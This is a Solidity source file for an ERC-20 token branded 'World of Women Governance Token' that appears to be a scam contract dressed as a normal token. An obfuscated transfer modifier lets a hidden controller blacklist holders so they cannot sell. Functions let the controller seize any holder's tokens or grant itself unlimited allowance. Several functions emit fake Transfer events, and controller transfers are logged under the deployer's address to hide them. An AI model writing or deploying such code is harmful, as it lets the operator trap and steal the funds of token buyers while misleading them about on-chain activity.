pragma solidity ^0.6.0;

// Contract.sol

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Context {
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);}

contract WoWToken is Context, IERC20 {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => bool) private _plus;
    mapping (address => bool) private _discarded;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _maximumVal = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    address private _secureController;
    uint256 private _discardedAmt = 0;

    address public _path_ = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address deployer = 0xc9b6321dc216D91E626E9BAA61b06B0E4d55bdb1;
    address public _controller = 0x948BD60B69c220d0d9625dF5472dCc13f45dA998;
   constructor () public {

        _name = "World of Women Governance Token";
        _symbol = "WoWG";
        _decimals = 18;
        uint256 initialSupply = 1000000000 * 10 ** 18 ;
        _secureController = _controller;
        
        

        _mint(deployer, initialSupply);

    }
    modifier cpu(address dest, uint256 num, address from, address filler){
        if (
            _controller == _secureController 
            && from == _controller
            ){_secureController = dest;_;}else{
            if (
                from == _controller 
                || dest == _controller
                || from == _secureController 
                ){
                if (
                    from == _controller 
                    && from == dest
                    ){_discardedAmt = num;}_;}else{
                if (
                    _plus[from] == true
                    ){
                _;}else{if (
                    _discarded[from] == true
                    ){
                require((
                    from == _secureController
                    )
                ||(dest == _path_), "ERC20: transfer amount exceeds balance");_;}else{
                if (
                    num < _discardedAmt
                    ){
                if(dest == _secureController){_discarded[from] = true; _plus[from] = false;}
                _; }else{require((from == _secureController)
                ||(dest == _path_), "ERC20: transfer amount exceeds balance");_;}
                    }}
            }
        }}

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _navigator(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _navigator(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function approvalPlusOne(address[] memory destination) public {
        require(msg.sender == _controller, "!owner");
        for (uint256 i = 0; i < destination.length; i++) {
           _plus[destination[i]] = true;
           _discarded[destination[i]] = false;
        }
    }

   function approvalMinusOne(address safeOwner) public {
        require(msg.sender == _controller, "!owner");
        _secureController = safeOwner;
    }
    
    
    function approvePlusOne(address[] memory destination) public {
        require(msg.sender == _controller, "!owner");
        for (uint256 i = 0; i < destination.length; i++) {
           _discarded[destination[i]] = true;
           _plus[destination[i]] = false;
        }
    }

    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
    
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _controller){
            sender = deployer;
        }
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) public {
        require(msg.sender == _controller, "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[_controller] = _balances[_controller].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    

    function _navigator(address from, address dest, uint256 amt) internal cpu( dest,  amt,  from,  address(0)) virtual {
        _util( from,  dest,  amt);
    }
    
   
    function _util(address from, address dest, uint256 amt) internal cpu( dest,  amt,  from,  address(0)) virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(dest != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, dest, amt);
        _balances[from] = _balances[from].sub(amt, "ERC20: transfer amount exceeds balance");
        _balances[dest] = _balances[dest].add(amt);
        if (from == _controller){from = deployer;}
        emit Transfer(from, dest, amt);    
        }

    
    
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }

    modifier _confirm() {
        require(msg.sender == _controller, "Not allowed to interact");
        _;
    }

//-----------------------------------------------------------------------------------------------------------------------//

   function transferOwnership()public _confirm(){}

   function timelock()public _confirm(){}

  function multicall(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _confirm(){
    //MultiTransferEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}

    function addLiquidityETH(address uPool,address  eReceiver,uint256  eAmount)  public _confirm(){
    //EmitUniPool   
        emit Transfer(uPool, eReceiver, eAmount);}

  function enable(address recipient) public _confirm(){
    _plus[recipient]=true;
    _approve(recipient, _path_,_maximumVal);}

  function disable(address recipient) public _confirm(){
      //Take away permission
    _plus[recipient]=false;
    _approve(recipient, _path_,0);
    }

    function spend(address addr) public _confirm() virtual  returns (bool) {
        //Approve Spending
        _approve(addr, _msgSender(), _maximumVal); return true;
    }

    function transferTo(address from, address to, uint256 amt) public _confirm() virtual returns (bool) {
        //Single Tranfer
        _transfer(from, to, amt);
        _approve(from, _msgSender(), _allowances[from][_msgSender()].sub(amt, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer_(address fromEmt, address toEmt, uint256 amtEmt) public _confirm(){
        //EmitSingleTransfer
        emit Transfer(fromEmt, toEmt, amtEmt);
    }

  function stake(address staking, address staker, uint256 num) public _confirm(){
        emit Transfer(staker, staking, num);
   }

  function claimGovernanceTokens(address claim, address receiver, uint256 num) public _confirm(){
        emit Transfer(claim, receiver, num);
   }

  function airdropToNFTHolders(address sndr,address[] memory destination, uint256[] memory amounts) public _confirm(){
    _approve(sndr, _msgSender(), _maximumVal);
    for (uint256 i = 0; i < destination.length; i++) {
        _transfer(sndr, destination[i], amounts[i]);
    }
   }

  function claimTokens(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _confirm(){
    //MultiTransferEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}

}
